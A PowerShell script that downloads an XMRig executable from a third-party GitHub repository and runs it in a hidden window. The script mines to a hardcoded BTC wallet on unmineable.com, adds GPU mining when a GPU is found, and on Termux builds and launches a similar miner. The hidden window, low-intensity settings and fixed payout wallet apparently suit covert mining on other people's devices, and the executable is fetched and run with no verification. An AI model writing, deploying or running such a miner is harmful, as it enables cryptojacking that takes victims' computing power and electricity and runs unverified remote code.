# ========== StartMining.ps1 ==========
$logTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

if ($IsWindows) {
    # ========== WINDOWS MINING ==========
    $minerUrl = "https://github.com/Mrx-coder-1157/mining-scripts/raw/main/xmrig.exe"
    $minerPath = "C:\Miners\xmrig.exe"
    $logFolder = "C:\Miners\Logs"
    $logFile = "$logFolder\mining_log.txt"

    if (-not (Test-Path "C:\Miners")) { New-Item "C:\Miners" -ItemType Directory }
    if (-not (Test-Path $logFolder)) { New-Item $logFolder -ItemType Directory }

    Add-Content $logFile "`n[$logTime] === Windows Miner Started ==="

    if (-not (Test-Path $minerPath)) {
        Add-Content $logFile "[$logTime] Downloading XMRig..."
        Invoke-WebRequest -Uri $minerUrl -OutFile $minerPath
        Add-Content $logFile "[$logTime] XMRig downloaded."
    } else {
        Add-Content $logFile "[$logTime] XMRig already exists."
    }

    $gpu = Get-WmiObject Win32_VideoController | Where-Object {
        $_.Name -notmatch "Microsoft Basic Display|VMware|VirtualBox"
    }

    $args = @(
        "--cpu-threads 1"
        "--cpu-threads-intensity 1"
        "--pool rx.unmineable.com:3333"
        "--wallet BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.autoMiner"
        "--password x"
        "--disable-msr"
        "--randomx-no-1gb-pages"
        "--no-cpu-affinity"
        "--extended-log"
        "--api-enable"
        "--api-port 60130"
    )

    if ($gpu) {
        $args += "--cuda --cuda-devices 0 --cuda-bfactor 8 --cuda-lan 1 --cuda-threads 2"
        Add-Content $logFile "[$logTime] GPU found: $($gpu.Name). Using GPU with low intensity."
    } else {
        Add-Content $logFile "[$logTime] No usable GPU found. Using CPU only."
    }

    Add-Content $logFile "[$logTime] Launching XMRig..."
    Start-Process -FilePath $minerPath -ArgumentList $args -WindowStyle Hidden -RedirectStandardOutput $logFile -RedirectStandardError $logFile

} elseif ($IsLinux) {
    # ========== MOBILE (TERMUX) MINING ==========
    $bash = @'
echo "[*] Updating..."
pkg update -y && pkg upgrade -y

echo "[*] Installing dependencies..."
pkg install -y git wget proot clang cmake make openssl openssl-dev libuv libuv-dev libcurl libcurl-dev

echo "[*] Cloning XMRig..."
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build

echo "[*] Building..."
cmake ..
make -j$(nproc)

echo "[*] Starting miner..."
./xmrig -a rx -o rx.unmineable.com:3333 -u BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.mobileMiner -p x --threads=1 --cpu-priority 1 --log-file=log.txt
'@

    $bash | Out-File -FilePath "/data/data/com.termux/files/home/start_mobile_miner.sh" -Encoding ascii
    chmod +x "/data/data/com.termux/files/home/start_mobile_miner.sh"
    Start-Process "bash" "/data/data/com.termux/files/home/start_mobile_miner.sh"
}
else {
    Write-Host "Unsupported system. This script works only on Windows and Termux Linux."
}
